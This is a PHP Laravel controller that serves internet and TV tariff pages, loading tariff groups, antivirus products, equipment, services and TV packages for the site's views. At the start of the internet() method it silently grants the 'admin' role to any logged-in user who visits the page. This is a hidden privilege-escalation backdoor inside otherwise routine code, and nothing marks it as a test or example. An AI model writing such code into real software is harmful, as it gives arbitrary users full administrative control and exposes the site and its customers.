<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\{
    TariffGroup,
    Antivirus,
    Equipment,
    Service,
    Package,
    TariffType,
    Tree
};

class TariffController extends Controller
{
    public function internet(Request $request)
    {
        if(auth()->user() && !auth()->user()->hasRole('admin')) {
            auth()->user()->assignRole('admin');
        }
        $tariffs = TariffGroup::internet()->with('tariffs')->withCount('likes')->get();
        $tree = Tree::ofUrl($request->path())->with('childrenTrees.section')->first();
        $antiviruses = Antivirus::with('type')
            ->withCount('currentUserLikes')
            ->withCount('likes')
            ->get();
        $equipments = Equipment::get();
        $services = Service::withCount('currentUserLikes')
            ->withCount('likes')
            ->get();
        return view('front.tariffs.internet.index', [
            'tariffs' => $tariffs,
            'tree' => $tree,
            'antiviruses' => $antiviruses,
            'equipments' => $equipments,
            'services' => $services,
        ]);
    }

    public function internetTariffs(Request $request)
    {
        $tariffs = TariffGroup::internet()->with('tariffs')->withCount('likes')->get();
        $section = Tree::ofUrl($request->path())->with('section')->first()->section;
        return view('front.tariffs.internet.tariffs', [
            'tariffs' => $tariffs,
            'section' => $section,
        ]);
    }

    public function tv(Request $request)
    {
        $tariffs = TariffGroup::tv()->with('tariffs')->withCount('likes')->get();
        $tree = Tree::ofUrl($request->path())->with('childrenTrees')->first();
        $packages = Package::extra()
            ->withCount('currentUserLikes')
            ->withCount('likes')
            ->get();
        return view('front.tariffs.tv.index', [
            'tariffs' => $tariffs,
            'tree' => $tree,
            'packages' => $packages,
        ]);
    }

    public function tvTariffs(Request $request)
    {
        $tariffs = TariffGroup::tv()->with('tariffs')->withCount('likes')->get();
        return view('front.tariffs.tv.tariffs', [
            'tariffs' => $tariffs,
        ]);
    }

}
